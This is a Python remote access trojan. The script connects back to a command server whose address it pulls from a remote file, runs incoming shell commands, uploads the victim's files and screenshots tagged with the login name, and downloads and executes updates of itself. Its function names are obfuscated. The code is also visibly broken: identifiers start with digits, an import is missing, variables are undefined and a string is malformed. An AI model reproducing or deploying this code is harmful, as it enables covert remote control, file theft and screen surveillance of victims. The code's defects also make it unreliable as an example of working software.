import sys,subprocess,socket,time,requests

from PIL import ImageGrab



VERSION = "1.29.11.24"

HOST = ""

PORT = ""

INFO_LOCATION = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"

SOURCE_LOCATION = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"

CMD_PREFIX = "!"



def connect(host, port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((host, port))

	return s



def process(s):

	data = s.recv(1024)

	if len(data)==0:

		return True

	else:

		a9oplfsbuw(s, data.decode("utf-8"))



def a9oplfsbuw(s, command):

	if not command.startswith(CMD_PREFIX):

		proc = subprocess.run(data.decode("utf-8"), shell=True, capture_output=True)

		result = proc.stdout + proc.stderr

		s.send(result)

		return



	cmd = command.split(" ")[0][1:]

	if cmd == "download":

		uiwengos2d(s, command)

	elif cmd == "screenshot":

		s9vw4ds66g(s)



def uiwengos2d(s, command):

	paths = command.replace(CMD_PREFIX+"screenshot ", "").split(",")

	results = []

	for f in paths:

		results += 9n2vnssnnkk(f, "api/file/", { "type":os.path.splitext(f)[1] })

	s.send(" ".join(results))



def s9vw4ds66g(command):

	image = ImageGrab.grab(

		bbox=None,

		include_layered_windows=False,

		all_screens=True,

		xdisplay=None

	)

	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"

	image.save(fpath)

	image.close()

	r = 9n2vnssnnkk(fpath, "api/sscap")

	os.remove(fpath)

	s.send(r)



def 9n2vnssnnkk(filePath, uploadPath, addHeaders=None):

	if not os.path.exists(filePath):

		return "FILE NOT FOUND: "+filePath

	headers = {"user":os.getlogin()}

	if addHeaders is not None:

		headers = {**headers, **addHeaders}

	requests.post(HOST+":"+PORT+"/"+uploadPath,

		files={open(filePath, "rb")},

		headers=headers)

	return "SUCCESS"



def getStartupInfo():

	if HOST == "" or PORT == "":

		data = requests.get(INFO_LOCATION).text.replace("\n","").split(":")

		HOST = data[0].strip()

		PORT = data[1].strip()

		version = data[2].strip()

	return host, port, version



def update():

	currentName = os.path.basename(__file__)

	fileType = currentName.split(".")[-1]

	updateFileName = currentName.replace(fileType,"") +"."+VERSION + fileType

	fullUpdateFilePath = os.path.join(os.path.getcwd(), updateFileName)

	with open(updateFileName, "wb+") as f:

		f.write(requests.get(SOURCE_LOCATION+"/file"+fullUpdateFilePath.split(".")[-1]))

	if executable:

		os.system(".\"+fullUpdateFilePath)

	else:

		os.system("python "+fullUpdateFilePath")



def gatherInfo():

	pass



def main():

	h, p, v = getStartupInfo()

	if VERSION != v:

		update()

	gatherInfo()



	while True:

		try:

			while True:

				socketDied=False

				try:

					s=connect(h, p)

					while not socketDied:

						s.send(b"\n>> ")

						socketDied=process(s)

					s.close()

				except:

					pass

				time.sleep(5)

		except:

			time.sleep(5)



sys.exit(main())
